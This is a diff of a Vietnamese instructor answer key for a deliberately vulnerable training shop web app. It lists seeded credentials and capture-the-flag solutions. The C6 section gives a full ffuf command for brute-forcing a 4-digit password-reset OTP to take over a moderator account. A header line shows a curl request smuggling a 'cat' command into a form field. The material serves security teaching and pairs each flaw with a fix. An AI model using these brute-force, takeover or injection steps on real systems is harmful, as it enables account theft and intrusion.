@@ -20,8 +20,9 @@
 | Email | Password | Role | Ghi chú |
 |-------|----------|------|---------|
 | admin@cybershop.vn | Admin#1337 | admin | secretNote = c2; apiKey sk_live_admin_9f3ac21e77 |
-| demo@cybershop.vn | demo123 | customer | OTP = 1337 (in công khai trên trang login) |
+| demo@cybershop.vn | demo123 | customer | account vào nhanh cho học viên |
 | moderator@cybershop.vn | ModBot#2024 | **moderator** | account của xss-bot — mục tiêu session hijacking C14; vào được /admin/reviews |
+| hanh@cybershop.vn | Qw7#vLp2 (học viên không cần — họ tự RESET) | **moderator** | mục tiêu C6: lộ ở robots.txt → brute OTP forgot-password → ATO; vào được /admin/reviews |
 | john@cybershop.vn | jordan23 | customer | **rockyou ✓** — order #1001 |
 | bob@cybershop.vn | monkey | customer | **rockyou top-20** — order #1042 chứa c7 |
 
@@ -38,7 +39,7 @@ Mirror MySQL `shopusers` dùng cùng password → dump SQLi + hashcat -m 0 + roc
 | C3 | FLAG{c3} | JWT alg:none | Trust failure trong verify tự viết | GET /admin/api/audit |
 | C4 | FLAG{c4} | Mass assignment | Server tin tưởng field client gửi | response PUT /api/profile |
 | C5 | FLAG{c5} | SQLi | Injection + DB extraction (UNION → dump → crack → ATO) | row flaguser trong shopusers |
-| C6 | FLAG{c6} | No rate limit | Brute-force / bounded secret space | response OTP đúng (brute 0000–9999) |
+| C6 | FLAG{c6} | No rate limit | Brute-force / bounded secret space | response OTP đúng (brute 0000–9999) + ATO: đổi mk Hanh rồi login |
 | C7 | FLAG{c7} | IDOR | Object-level authorization | note order #1042 |
 | C8 | FLAG{c8} | Misconfig | Debug interface exposure | trang /debug |
 | C9 | FLAG{c9} | SSRF | Internal network pivot | http://flag-service:8080/flag |
@@ -99,12 +100,26 @@ Content-Type: application/json
 ```
 → response chứa `"role":"admin"` + `extended.flag` = **C4**. Nav hiện mục Admin. *Root cause: `$set: req.body` không whitelist field.*
 
-**C6 — OTP không rate limit (hỗ trợ M1)**
-- *Bản chất:* endpoint verify OTP không có bộ đếm lần thử, không lockout, không delay → mã 4 số = tối đa 10.000 request là chắc chắn đúng.
-- *Phát hiện:* trang `/auth/otp` (in công khai demo account + OTP=1337 để học viên nhanh vào app — xem mục 4b số 5 nếu muốn bắt brute-force thật).
-- *Payload:* Burp Intruder / ffuf dò `code` từ 0000–9999 trên `POST /auth/otp-verify`; response khác biệt ở "OTP verified".
-- *Flag:* response thành công trả thẳng **FLAG{c6}**.
-- *Fix đúng:* rate limit theo IP+account, lockout tạm thời, OTP hết hạn 60s, tối đa 5 lần thử.
+**C6 — Forgot-password: brute-force OTP (hỗ trợ M1)**
+- *Bản chất:* flow "Quên mật khẩu" dùng OTP 4 số lưu DB (hết hạn 5 phút), nhưng endpoint verify **không có bộ đếm lần thử, không lockout, không delay** → tối đa 10.000 request là chắc chắn đúng.
+- *Mục tiêu:* `hanh@cybershop.vn` — moderator người thật, **lộ trong robots.txt** (dòng comment "Staff on-duty… TICKET-4033"). Tách biệt account bot `moderator@` để đổi mk Hanh không làm chết xss-bot.
+- *Flow khai thác:*
+  ```
+  robots.txt → thấy email hanh@cybershop.vn
+        ↓
+  /auth/forgot (link "Quên mật khẩu?" ở trang login) → nhập email hanh@
+        ↓ server sinh OTP 4 số, "gửi qua mail" (mail server = log container web)
+  POST /auth/otp-verify {email, code} → brute 0000–9999 (Intruder/ffuf/curl loop)
+        ↓ response khác biệt: "Invalid or expired OTP" vs trang thành công
+  Thành công → hiện FLAG{c6} + form ĐỔI MẬT KHẨU
+        ↓
+  Đặt mật khẩu mới → đăng nhập bằng hanh@ + mk mới = ACCOUNT TAKEOVER (role moderator)
+        ↓ (chuỗi) vào được /admin/reviews — nhìn thấy dữ liệu kiểm duyệt
+  ```
+- *Payload mẫu:* `ffuf -X POST -d "email=hanh@cybershop.vn&code=FUZZ" -w digits.txt -H 'Content-Type: application/x-www-form-urlencoded' -u https://…/auth/otp-verify -fr "Invalid"`; hoặc curl loop.
+- *Chấm evidence:* (1) response verify thành công chứa FLAG{c6}; (2) screenshot đăng nhập được với tư cách "Hanh Nguyen" sau khi tự đặt mật khẩu mới.
+- *Lưu ý dạy kèm:* OTP thật phải gửi kênh out-of-band; ở lab nó nằm trong `docker compose logs web` (dòng `[mail] to …`) — giáo viên xem để hỗ trợ học viên kẹt. Thông báo forgot trả generic bất kể email có tồn tại (chống enumeration — điểm thảo luận).
+- *Fix đúng:* rate limit theo IP+account, lockout tạm thời, OTP hết hạn ngắn (60s), tối đa 5 lần thử, OTP 6+ số, không lộ email nhân viên trong robots.txt.
 
 ### MISSION 2 — Broken Access Control
 
@@ -264,7 +279,7 @@ curl -H "Cookie: <admin-token>" --data-urlencode 'target=x; cat /opt/scripts/net
 
 4. **Thời lượng** → `lab_duration = 7200` (2h) làm trần platform; pedagogy chia **3 session × 60–90 phút**: (S1) Recon + M1 + M2 · (S2) M3 + M4 · (S3) free play + chaining + report. Junior yếu vẫn hoàn thành 3–5 finding; khá thì chain; mạnh phá nát app — một lab phục vụ cả ba mức, không cần 3 bản difficulty.
 
-5. **OTP demo in công khai trên trang login** (`demo@cybershop.vn / demo123`, OTP=1337) → **giữ**, vì mục đích chính là giảm friction vào app. Muốn chấm brute-force thật: yêu cầu evidence Intruder/ffuf trên mã khác, hoặc anh xoá hint khi ra đề riêng bài rate-limit.
+5. **OTP C6 là brute-force thật** (mã random 4 số, hết hạn 5 phút, mục tiêu `hanh@` lộ ở robots.txt) — không còn OTP demo 1337 in trên trang login. Học viên kẹt có thể xem log "mail server": `docker compose logs web | grep "\[mail\]"`.
 
 6. **Đồng bộ password seed Mongo ↔ MySQL** — `jordan23`/`monkey` phải khớp ở cả `config/db.js` lẫn `seed/schema.sql`. Sửa một chỗ quên chỗ kia → path crack sẽ login fail (đã dính và sửa rồi). Có trong checklist bảo trì.
 
